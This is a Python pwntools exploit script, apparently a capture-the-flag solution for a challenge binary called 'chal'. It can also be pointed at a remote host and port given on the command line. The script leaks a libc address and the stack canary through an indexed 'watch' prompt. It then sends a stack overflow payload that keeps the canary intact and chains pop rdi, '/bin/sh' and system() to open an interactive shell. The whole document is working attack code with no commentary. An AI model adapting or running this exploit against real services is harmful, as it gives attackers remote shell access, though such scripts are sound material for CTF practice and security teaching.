from pwn import *
import sys
context.log_level = 'debug'
context.arch = 'amd64'
if len(sys.argv) == 1:
    r = process('./chal')
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print('Usage: python3 {} [GDB | remote]'.format(sys.argv[0]))
    sys.exit(1)
s = lambda data: r.send(data)
sl = lambda data: r.sendline(data)
sa = lambda x, y: r.sendafter(x, y)
sla = lambda x, y: r.sendlineafter(x, y)
ru = lambda delims, drop=True: r.recvuntil(delims, drop)
uu32 = lambda data, num: u32(r.recvuntil(data)[-num:].ljust(4, b'\x00'))
uu64 = lambda data, num: u64(r.recvuntil(data)[-num:].ljust(8, b'\x00'))
leak = lambda name, addr: log.success('{} = {}'.format(name, addr))
l64 = lambda : u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
l32 = lambda : u32(r.recvuntil('\xf7')[-4:].ljust(4, b'\x00'))

sla('user: ', b'1')
sla('watch: ', b'13')
ru('The number is: ')
libc = int(r.recvline().strip()) - 0x29d90
leak('libc', hex(libc))
sla('watch: ', b'11')
ru('The number is: ')
canary = int(r.recvline().strip())
leak('canary', hex(canary))

pop_rdi = libc + 0x000000000002a3e5
bin_sh = libc + 0x1d8678
ret = pop_rdi + 1
system = libc + 0x50d70

payload = b'A' * 0x28 + p64(canary) + b'B' * 8 + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
sla('message: ', payload)
r.interactive()
